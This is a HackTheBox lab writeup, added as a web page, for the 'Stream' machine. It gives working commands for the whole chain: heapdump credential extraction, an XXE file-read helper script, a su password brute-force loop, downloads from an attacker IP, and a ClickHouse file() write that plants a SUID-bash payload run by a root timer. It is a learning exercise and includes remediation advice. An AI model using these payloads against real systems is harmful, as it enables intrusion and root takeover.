@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Stream — HTB Writeup | Anmol Chaudhary</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../styles.css">
+<style>
+  .wu { max-width: 820px; margin: 0 auto; padding: 56px 20px 80px; }
+  .wu-back { font-family: var(--mono); font-size: 0.85rem; color: var(--text-dim); display: inline-flex; align-items: center; gap: 6px; margin-bottom: 24px; transition: color 0.2s ease; }
+  .wu-back:hover { color: var(--accent); text-decoration: none; }
+  .wu-meta { display: flex; align-items: center; gap: 12px; margin: 14px 0 32px; font-family: var(--mono); font-size: 0.85rem; }
+  .wu-date { color: var(--text-dim); margin-left: 6px; }
+  .wu h1 { font-size: 1.8rem; margin: 12px 0 8px; color: var(--text); border-bottom: 1px solid var(--border); padding-bottom: 12px; }
+  .wu h2 { font-size: 1.25rem; margin: 36px 0 14px; color: var(--accent); }
+  .wu h3 { font-size: 1.05rem; margin: 24px 0 10px; color: #f6efe2; }
+  .wu h4 { font-size: 0.95rem; margin: 18px 0 8px; color: var(--text); }
+  .wu p { color: var(--text); max-width: 72ch; margin: 0 0 16px; line-height: 1.65; }
+  .wu pre {
+    background: var(--surface); border: 1px solid var(--border); border-left: 3px solid var(--accent);
+    border-radius: var(--radius); padding: 14px 18px; overflow-x: auto; font-family: var(--mono);
+    font-size: 0.86rem; color: var(--ok); margin: 18px 0 24px; box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+  }
+  .wu code { font-family: var(--mono); background: var(--surface-2); padding: 2px 6px; border-radius: 3px; font-size: 0.88em; border: 1px solid var(--border); }
+  .wu pre code { background: transparent; padding: 0; border: none; font-size: inherit; }
+  .table-wrap { overflow-x: auto; margin: 20px 0; border: 1px solid var(--border); border-radius: var(--radius); }
+  .wu table { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 0.85rem; text-align: left; }
+  .wu th, .wu td { padding: 10px 14px; border-bottom: 1px solid var(--border); }
+  .wu th { background: var(--surface-2); color: var(--accent); font-weight: 600; }
+  .wu tr:last-child td { border-bottom: none; }
+  .wu ul, .wu ol { color: var(--text); padding-left: 24px; margin: 12px 0 20px; }
+  .wu li { margin-bottom: 8px; }
+  .wu blockquote { border-left: 3px solid var(--accent); background: var(--surface); margin: 18px 0 24px; padding: 12px 18px; border-radius: var(--radius); color: var(--text-dim); }
+  .wu blockquote p { margin: 0 0 10px; }
+  .wu blockquote p:last-child { margin-bottom: 0; }
+  .wu hr { border: none; border-top: 1px solid var(--border); margin: 36px 0; }
+</style>
+</head>
+<body>
+<header class="nav">
+  <div class="nav-inner">
+    <a href="../index.html" class="nav-prompt">anmol@portfolio<span class="nav-sep">:~$</span><span class="cursor">_</span></a>
+    <a href="../index.html#writeups" class="wu-back" style="margin-bottom:0;">&larr; writeups directory</a>
+  </div>
+</header>
+
+<main class="wu">
+  <a href="../index.html#writeups" class="wu-back">&larr; back to all writeups</a>
+  <h1>Stream</h1>
+  <div class="wu-meta">
+    <span class="os-tag os-linux">Linux</span>
+    <span class="diff-tag diff-medium">Medium</span>
+    <span class="wu-date">Pwned: 2026-10-17</span>
+  </div>
+
+  <h2>Machine Info</h2>
+  <div class="table-wrap"><table><thead><tr><th>Field</th><th>Details</th></tr></thead><tbody>
+  <tr><td>Machine Name</td><td>Stream</td></tr>
+  <tr><td>OS</td><td>Linux</td></tr>
+  <tr><td>Difficulty</td><td>Medium</td></tr>
+  <tr><td>Status</td><td>Pwned</td></tr>
+  </tbody></table></div>
+  <hr>
+
+  <h2>Tools Used</h2>
+  <ul>
+    <li><code>nmap</code> — port and service enumeration</li>
+    <li><code>curl</code> / <code>ffuf</code> — web and vhost enumeration</li>
+    <li><code>JDumpSpider</code> — Spring Boot heap dump credential extraction</li>
+    <li><code>clickhouse-client</code> — database interaction and <code>file()</code> write primitive</li>
+    <li><code>hydra</code> / <code>su</code> brute — password recovery</li>
+    <li><code>kopia</code> — backup repository restore</li>
+    <li>Kafka console tools (<code>kafka-console-producer.sh</code>) — DLQ message injection</li>
+    <li><code>linpeas</code> — privilege escalation enumeration</li>
+  </ul>
+  <hr>
+
+  <h2>Summary</h2>
+  <p>Stream is an airport-themed data-pipeline machine built around three loosely-coupled services: an nginx virtual host, a FastAPI AIDX ingest endpoint on 8081, and a Spring Boot gateway exposing an <strong>unrestricted actuator heap dump</strong>. Parsing the heap dump recovers Hikari connection credentials for a ClickHouse database. The AIDX ingest feeds an XML pipeline whose parser resolves <strong>external entities (XXE)</strong>; because parsed fields are persisted to a queryable ClickHouse table, the blind, asynchronous pipeline becomes a usable arbitrary-file-read channel. Reading Kafka's <code>server.properties</code> discloses an inline SASL credential (<code>svc_infra</code>) reused as the SSH password, yielding a foothold.</p>
+  <p>From there, a weak <code>su</code> password (<code>tinkerbell</code>) pivots to <code>martin_cole</code>, whose home holds a <strong>Kopia backup repository</strong>. Restoring a snapshot of ClickHouse logs surfaces the privileged <code>default</code> database password in a logged syntax-error. That admin account holds the <code>FILE</code> grant, allowing a malicious Python <strong>quarantine formatter</strong> to be written into ClickHouse's <code>user_files</code> directory via the <code>file()</code> table function. A <strong>root-owned systemd timer</strong> (<code>aidx-dlq-drainer</code>) executes that formatter against each dead-letter-queue message, so producing a single message to the unauthenticated Kafka DLQ topic triggers root code execution.</p>
+  <hr>
+
+  <h2>Reconnaissance</h2>
+  <h3>Initial Scan (NMAP)</h3>
+  <pre><code># Nmap 7.991 scan initiated as: nmap -sC -sV -A -oN ./recon/scan.txt 10.129.15.151
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://api.htb-airport.htb/
+8081/tcp open  http    Uvicorn
+|_http-title: Site doesn't have a title (application/json).
+|_http-server-header: uvicorn
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+  <p><strong>Open Ports:</strong></p>
+  <div class="table-wrap"><table><thead><tr><th>Port</th><th>Service</th><th>Version</th><th>Notes</th></tr></thead><tbody>
+  <tr><td>22</td><td>SSH</td><td>OpenSSH 9.6p1</td><td>Standard; later the foothold via reused Kafka SASL credential</td></tr>
+  <tr><td>80</td><td>HTTP</td><td>nginx 1.24.0</td><td>Redirects to <code>api.htb-airport.htb</code>; reverse proxy to Spring gateway</td></tr>
+  <tr><td>8081</td><td>HTTP</td><td>Uvicorn</td><td>FastAPI AIDX flight-leg ingest; XML <code>POST /feeds/aidx</code></td></tr>
+  </tbody></table></div>
+  <p>The redirect reveals the base domain <code>htb-airport.htb</code>. Added to <code>/etc/hosts</code>:</p>
+  <pre><code>echo "10.129.x.x  htb-airport.htb api.htb-airport.htb db.htb-airport.htb" | sudo tee -a /etc/hosts</code></pre>
+
+  <h3>Web Enumeration</h3>
+  <p>Virtual-host and directory enumeration surfaced three hosts and the key endpoints:</p>
+  <pre><code># vhosts discovered: api. (Spring gateway) and db. (ClickHouse HTTP)
+# 8081 FastAPI self-documents at /docs and /openapi.json
+ffuf -w ~/SecLists/Discovery/Web-Content/common.txt -u http://htb-airport.htb:8081/FUZZ -mc 200,301,302,401,403
+#   docs    [Status: 200]
+#   health  [Status: 200]</code></pre>
+  <p><strong>Findings:</strong></p>
+  <ul>
+    <li><code>api.htb-airport.htb</code> — Spring Boot gateway exposing <code>/actuator</code> with an <strong>unrestricted heapdump</strong>.</li>
+    <li><code>db.htb-airport.htb</code> — ClickHouse HTTP interface (<code>/ping</code> &rarr; <code>Ok.</code>), requires authentication.</li>
+    <li><code>htb-airport.htb:8081</code> — FastAPI AIDX ingest: <code>GET /</code>, <code>GET /health</code>, <code>POST /feeds/aidx</code>.</li>
+  </ul>
+  <pre><code>curl -s http://api.htb-airport.htb/actuator | jq
+# {
+#   "_links": {
+#     "self":     { "href": ".../actuator" },
+#     "heapdump": { "href": ".../actuator/heapdump" }
+#   }
+# }</code></pre>
+  <hr>
+
+  <h2>Vulnerability Identification</h2>
+  <h3>Identified Technologies</h3>
+  <div class="table-wrap"><table><thead><tr><th>Technology</th><th>Version</th><th>Notes</th></tr></thead><tbody>
+  <tr><td>Spring Boot Actuator</td><td>—</td><td><code>/actuator/heapdump</code> exposed unauthenticated</td></tr>
+  <tr><td>ClickHouse</td><td>26.8.1</td><td>Kafka-backed AIDX pipeline; <code>file()</code> write primitive</td></tr>
+  <tr><td>FastAPI / Uvicorn</td><td>0.1.0</td><td>AIDX ingest; forwards XML to Kafka raw topic</td></tr>
+  <tr><td>lxml etree</td><td>—</td><td>Parser configured <code>resolve_entities=True</code>, <code>no_network=False</code> (XXE)</td></tr>
+  <tr><td>Apache Kafka</td><td>2.13-4.3.1</td><td>Unauthenticated PLAINTEXT broker on localhost; DLQ topic</td></tr>
+  <tr><td>Kopia</td><td>—</td><td>Backup repository in <code>martin_cole</code>'s home</td></tr>
+  </tbody></table></div>
+
+  <h3>Vulnerabilities Identified</h3>
+  <p>This machine is built on <strong>misconfigurations and insecure design</strong>, not published CVEs. No public CVE was exploited; the weaknesses are:</p>
+  <div class="table-wrap"><table><thead><tr><th>Weakness</th><th>Description</th><th>Severity</th></tr></thead><tbody>
+  <tr><td>Exposed Spring Actuator heapdump</td><td>Unauthenticated <code>/actuator/heapdump</code> leaks live DB credentials from JVM memory</td><td>High</td></tr>
+  <tr><td>XXE (XML External Entity)</td><td><code>lxml</code> parser with <code>resolve_entities=True</code> + <code>no_network=False</code>; parsed output persisted to queryable ClickHouse table enables blind arbitrary file read</td><td>High</td></tr>
+  <tr><td>Credential exposure in config</td><td>Kafka <code>server.properties</code> stores a SASL PLAIN credential inline, reused as an SSH password</td><td>High</td></tr>
+  <tr><td>Weak password</td><td><code>martin_cole</code> uses a dictionary password (<code>tinkerbell</code>)</td><td>Medium</td></tr>
+  <tr><td>Credential leak in logs</td><td>A logged <code>ALTER USER ... IDENTIFIED BY</code> syntax error exposes the ClickHouse admin password</td><td>High</td></tr>
+  <tr><td>Insecure trust boundary / arbitrary file write</td><td>A root systemd timer executes a formatter script from a directory writable by the ClickHouse <code>file()</code> function</td><td>Critical</td></tr>
+  </tbody></table></div>
+  <blockquote>
+    <p><strong>Note on CVEs:</strong> No CVEs were required to own Stream. The entire chain is misconfiguration and insecure design (exposed diagnostics, XXE, credential reuse, log leakage, and a root service executing database-writable content). The LinPEAS run flagged several <em>potential</em> kernel CVEs (e.g. CVE-2026-23111 nftables, CVE-2026-43284 Dirty Frag) but all required unprivileged user namespaces, which were disabled — none were used.</p>
+  </blockquote>
+  <hr>
+
+  <h2>Initial Foothold / Initial Access</h2>
+  <h3>Vulnerability: Spring Actuator Heap Dump &rarr; ClickHouse Credentials</h3>
+  <p><strong>Description:</strong> The Spring Boot gateway exposes <code>/actuator/heapdump</code> without authentication. A heap dump is a snapshot of JVM memory that retains live objects — including the Hikari connection-pool credentials used to reach ClickHouse.</p>
+  <blockquote>
+    <p><strong>Gotcha — MTU:</strong> The heap dump download repeatedly stalled (connection reset, zero bytes). The cause was an <strong>MTU mismatch</strong> on the VPN tunnel: small requests succeeded but large transfers were silently dropped. Fixed with:</p>
+    <pre><code>sudo ip link set dev tun0 mtu 1200</code></pre>
+    <p>After this, the dump downloaded cleanly. (Lesson: on a VPN, if small requests work but large downloads hang/die — suspect MTU first.)</p>
+  </blockquote>
+  <p><strong>Steps:</strong></p>
+  <pre><code># download the heap dump (after MTU fix)
+curl -s http://api.htb-airport.htb/actuator/heapdump -o heapdump.hprof
+
+# extract credentials
+java -jar JDumpSpider.jar heapdump.hprof
+# UserPassSearcher -&gt;
+#   com.zaxxer.hikari.util.Credentials:
+#   [password = Yl4aCgh4y2PnU, username = svc_events]</code></pre>
+  <p><strong>Result:</strong> ClickHouse service credentials <code>svc_events</code> / <code>Yl4aCgh4y2PnU</code>.</p>
+
+  <h3>Mapping the ClickHouse pipeline</h3>
+  <pre><code>curl -s "http://db.htb-airport.htb/?query=SHOW%20DATABASES" -u 'svc_events:Yl4aCgh4y2PnU'
+# partner_feed
+
+# tables form two Kafka-ingest pipelines (raw XML + parsed JSON)
+#   flightleg_raw / flightleg_raw_kafka / flightleg_raw_mv
+#   flightleg_json / flightleg_json_kafka / flightleg_json_mv</code></pre>
+  <p>XML submitted to <code>/feeds/aidx</code> is stored verbatim in <code>flightleg_raw</code> and parsed into structured columns in <code>flightleg_json</code>. The <strong>parse step</strong> is where the XXE fires — so <code>flightleg_json</code> becomes the read-back channel.</p>
+
+  <h3>Vulnerability: Blind XXE via the AIDX pipeline</h3>
+  <p><strong>Description:</strong> The parser (<code>aidx_common.py</code>) builds the lxml parser with external-entity resolution enabled:</p>
+  <pre><code>def _plain_parser():
+    return etree.XMLParser(load_dtd=True, resolve_entities=True, no_network=False)</code></pre>
+  <p>The ingest only pattern-matches required substrings and forwards to Kafka; the downstream worker parses the XML (expanding entities) and persists the result. Entities resolve in <strong>element text</strong> (not attributes), and the parser reads <code>originator</code> from the <code>Code</code> attribute and <code>airline</code> from the <code>&lt;Airline&gt;</code> text — so placing the entity in <code>&lt;Airline&gt;</code> surfaces file contents in the <code>airline</code> column.</p>
+  <p><strong>Steps:</strong></p>
+  <p>A reusable helper to read any file (fresh flight number each time to avoid stale rows):</p>
+  <pre><code>xxeread() {
+cat &gt; /tmp/x.xml &lt;&lt;EOF
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE r [ &lt;!ENTITY xxe SYSTEM "file://$1"&gt; ]&gt;
+&lt;ns0:IATA_AIDX_FlightLegNotifRQ xmlns:ns0="http://www.iata.org/IATA/2007/00" Version="22.1" TransactionStatusCode="Update"&gt;
+  &lt;ns0:Originator CompanyShortName="BAW" Code="ZZ" CodeContext="3"/&gt;
+  &lt;ns0:FlightLeg&gt;&lt;ns0:LegIdentifier&gt;
+    &lt;ns0:Airline CodeContext="3"&gt;&amp;xxe;&lt;/ns0:Airline&gt;
+    &lt;ns0:FlightNumber&gt;$2&lt;/ns0:FlightNumber&gt;
+  &lt;/ns0:LegIdentifier&gt;&lt;/ns0:FlightLeg&gt;
+&lt;/ns0:IATA_AIDX_FlightLegNotifRQ&gt;
+EOF
+curl -s -X POST http://htb-airport.htb:8081/feeds/aidx -H 'Content-Type: application/xml' --data-binary @/tmp/x.xml -w " [%{http_code}]\n"
+}
+ch() { curl -s "http://db.htb-airport.htb/" -u 'svc_events:Yl4aCgh4y2PnU' --data-binary "$*"; }
+
+# read /etc/passwd
+xxeread /etc/passwd 1001
+# wait ~30s, then read back
+ch "SELECT flight_number, airline FROM partner_feed.flightleg_json WHERE flight_number='1001' FORMAT Vertical"</code></pre>
+  <p><code>/etc/passwd</code> revealed the interactive users: <code>svc-infra</code> and <code>martin_cole</code>.</p>
+
+  <h3>Finding the foothold credential (Kafka <code>server.properties</code>)</h3>
+  <p>The systemd unit named the exact Kafka install path, which was version-specific:</p>
+  <pre><code>xxeread /etc/systemd/system/kafka.service 82001
+# WorkingDirectory=/opt/kafka_2.13-4.3.1
+# ExecStart=/opt/kafka_2.13-4.3.1/bin/kafka-server-start.sh /opt/kafka_2.13-4.3.1/config/server.properties
+
+xxeread /opt/kafka_2.13-4.3.1/config/server.properties 84001</code></pre>
+  <p>The Security section of <code>server.properties</code> disclosed an inline SASL credential:</p>
+  <pre><code>listener.name.sasl_plaintext.plain.sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \
+  user_svc_infra="Ny2hdpme$bwT3";</code></pre>
+  <p><strong>Credentials Found:</strong></p>
+  <div class="table-wrap"><table><thead><tr><th>Username</th><th>Password</th><th>Hash</th><th>Service</th></tr></thead><tbody>
+  <tr><td>svc_events</td><td>Yl4aCgh4y2PnU</td><td>N/A</td><td>ClickHouse (partner_feed)</td></tr>
+  <tr><td>svc-infra</td><td>Ny2hdpme$bwT3</td><td>N/A</td><td>Kafka SASL &rarr; reused for SSH</td></tr>
+  </tbody></table></div>
+  <p><strong>Result:</strong> The Kafka password is reused as <code>svc-infra</code>'s SSH password.</p>
+  <pre><code>ssh svc-infra@htb-airport.htb
+# password: Ny2hdpme$bwT3
+svc-infra@stream:~$ id
+# uid=1000(svc-infra) gid=1000(svc-infra) groups=1000(svc-infra),100(users)</code></pre>
+  <hr>
+
+  <h2>Post-Exploitation</h2>
+  <h3>System Enumeration</h3>
+  <pre><code># transfer and run linpeas
+curl http://10.10.14.39:8000/linpeas.sh -o linpeas.sh &amp;&amp; chmod +x linpeas.sh &amp;&amp; ./linpeas.sh</code></pre>
+  <p><strong>Key Findings:</strong></p>
+  <ul>
+    <li>Root-owned timer <code>aidx-dlq-drainer.timer</code> &rarr; <code>aidx-dlq-drainer.service</code> firing every ~2 minutes.</li>
+    <li>Localhost-only services now reachable: ClickHouse (<code>127.0.0.1:8123</code>/<code>9000</code>), Kafka (<code>127.0.0.1:9092</code>), terminal-api (<code>127.0.0.1:8080</code>).</li>
+    <li><code>martin_cole</code> home not readable as <code>svc-infra</code>; ClickHouse <code>default</code> user requires an unknown password.</li>
+  </ul>
+
+  <h3>Lateral Movement to <code>martin_cole</code></h3>
+  <p><strong>Description:</strong> <code>martin_cole</code> uses a weak password. Brute-forced locally via <code>su</code> (avoids the active fail2ban that would jail SSH attempts).</p>
+  <p><strong>Steps:</strong></p>
+  <pre><code># pull a wordlist onto the box
+curl http://10.10.14.39:8000/rockyou.txt -o /tmp/rockyou.txt
+
+# local su brute (serial — stable, no fail2ban interaction)
+while IFS= read -r p; do
+  echo "$p" | timeout 1 su martin_cole -c 'id' 2&gt;/dev/null | grep -q 'uid=1001' \
+    &amp;&amp; { echo "[+] FOUND: $p"; break; }
+done &lt; /tmp/rockyou.txt
+# [+] FOUND: tinkerbell</code></pre>
+  <p><strong>Credentials Found:</strong></p>
+  <div class="table-wrap"><table><thead><tr><th>Username</th><th>Password</th><th>Hash</th><th>Service</th></tr></thead><tbody>
+  <tr><td>martin_cole</td><td>tinkerbell</td><td>N/A</td><td>OS user</td></tr>
+  </tbody></table></div>
+
+  <h3>User Flag</h3>
+  <pre><code>su - martin_cole   # tinkerbell
+cat ~/user.txt</code></pre>
+  <pre><code>47bd459abd4a02b256e6cdca8fbfda6f</code></pre>
+  <hr>
+
+  <h2>Privilege Escalation</h2>
+  <h3>Enumeration — Kopia backup &rarr; admin ClickHouse password</h3>
+  <p><strong>Description:</strong> <code>martin_cole</code> owns a configured Kopia backup repository containing a snapshot of ClickHouse logs. A historical log captured an <code>ALTER USER default IDENTIFIED BY '...'</code> statement that failed with a syntax error — logging the admin password in plaintext.</p>
+  <p><strong>Steps:</strong></p>
+  <pre><code>kopia repository status
+kopia snapshot list --all
+mkdir -p /tmp/restore
+kopia snapshot restore &lt;snapshot-id&gt; /tmp/restore
+
+grep -riE 'password|identified' /tmp/restore 2&gt;/dev/null | head
+# clickhouse-server.err.log:
+#   Code: 62. DB::Exception: Double quoted string is not closed: ...
+#   "ALTER USER default IDENTIFIED BY 'N3v3rs33nD4T4 ;"</code></pre>
+  <p><strong>Credentials Found:</strong></p>
+  <div class="table-wrap"><table><thead><tr><th>Username</th><th>Password</th><th>Hash</th><th>Service</th></tr></thead><tbody>
+  <tr><td>default</td><td>N3v3rs33nD4T4</td><td>N/A</td><td>ClickHouse admin</td></tr>
+  </tbody></table></div>
+  <pre><code>clickhouse client --user default --password 'N3v3rs33nD4T4' --query "SELECT currentUser()"
+# default
+clickhouse client --user default --password 'N3v3rs33nD4T4' --query "SHOW GRANTS"
+# GRANT ... FILE, URL, ... KAFKA, SOURCES ON *.* TO default WITH GRANT OPTION</code></pre>
+  <p>The <code>default</code> account holds the <strong><code>FILE</code></strong> grant — the write primitive needed for the final step.</p>
+
+  <h3>Vulnerability: Root-Executed Quarantine Formatter (Arbitrary File Write Trust Boundary)</h3>
+  <p><strong>Description:</strong> <code>/opt/ops/dlq_drainer.py</code> runs as <strong>root</strong> (via <code>aidx-dlq-drainer.service</code>, <code>Type=oneshot</code>, on a ~2-minute timer). For each dead-letter-queue message it executes a formatter script <strong>as root</strong>:</p>
+  <pre><code>FORMATTER = "/var/lib/clickhouse/user_files/aidx_quarantine.py"
+...
+subprocess.run(["python3", FORMATTER], input=raw, capture_output=True, check=False)</code></pre>
+  <p>That formatter lives in ClickHouse's <code>user_files</code> directory — writable by the <code>default</code> user through the <code>file()</code> table function. A database admin can therefore replace a script that root later executes: a complete trust-boundary failure.</p>
+  <p><strong>Steps:</strong></p>
+  <pre><code># 1) overwrite the formatter with a root payload (SUID bash)
+#    engine_file_truncate_on_insert=1 =&gt; overwrite instead of append
+clickhouse client --user default --password 'N3v3rs33nD4T4' --query \
+"INSERT INTO FUNCTION file('aidx_quarantine.py', 'LineAsString', 'line String') \
+ SETTINGS engine_file_truncate_on_insert=1 \
+ VALUES ('import os'), ('os.system(\"cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\")')"
+
+# verify the written formatter
+clickhouse client --user default --password 'N3v3rs33nD4T4' --query \
+"SELECT * FROM file('aidx_quarantine.py', 'LineAsString')"
+# import os
+# os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")
+
+# 2) trigger the drainer: produce a message to the unauthenticated DLQ topic
+echo '&lt;trigger/&gt;' | /opt/kafka_2.13-4.3.1/bin/kafka-console-producer.sh \
+  --bootstrap-server 127.0.0.1:9092 \
+  --topic aidx.flightleg.dlq.v1 \
+  --producer-property request.timeout.ms=20000
+
+# 3) wait up to ~2 min for the root timer, then use the SUID bash
+ls -la /tmp/rootbash          # -rwsr-xr-x 1 root root ...
+/tmp/rootbash -p</code></pre>
+  <blockquote>
+    <p><strong>Note:</strong> <code>kafka-console-producer.sh</code> may emit <code>REQUEST_TIMED_OUT</code> warnings under load; the message often still lands. Confirm with <code>kafka-console-consumer.sh --from-beginning</code> if the timer doesn't fire, or re-send.</p>
+  </blockquote>
+  <p><strong>Result:</strong></p>
+  <pre><code>/tmp/rootbash -p
+id
+# uid=1000(svc-infra) ... euid=0(root) ...  (or uid=0 depending on payload)</code></pre>
+
+  <h3>Root Flag</h3>
+  <pre><code>cat /root/root.txt</code></pre>
+  <pre><code>cfce72f65e81bb4df63460ca869ce672</code></pre>
+  <hr>
+
+  <h2>Trophy</h2>
+  <pre><code>https://labs.hackthebox.com/achievement/machine/1574945/990</code></pre>
+  <p><em>Completed as part of HackTheBox practice in a legal, controlled environment.</em></p>
+  <hr>
+
+  <h2>Takeaways / Remediation</h2>
+  <ul>
+    <li><strong>Restrict actuator endpoints</strong> and treat heap dumps as highly sensitive — they retain live secrets.</li>
+    <li><strong>Disable external entity resolution</strong> (<code>resolve_entities=False</code>, <code>no_network=True</code>) in XML parsers unless explicitly required.</li>
+    <li><strong>Never store credentials inline in config files</strong>, and never reuse a service credential as an interactive login password.</li>
+    <li><strong>Protect backups and logs</strong> as carefully as application secrets — historic records leak valid credentials.</li>
+    <li><strong>A root service must never execute content from a path writable by a lower-privileged account.</strong> The formatter should be root-owned, immutable to the database, and validated before execution.</li>
+    <li>Enforce strong passwords on all interactive accounts.</li>
+  </ul>
+</main>
+
+<footer class="footer">
+  <p>&copy; <span id="year"></span> Anmol Chaudhary — built with HTML, CSS, and curiosity.</p>
+</footer>
+<script>document.getElementById('year').textContent = new Date().getFullYear();</script>
+<script type="module" src="../js/modules/writeup.js"></script>
+</body>
+</html>
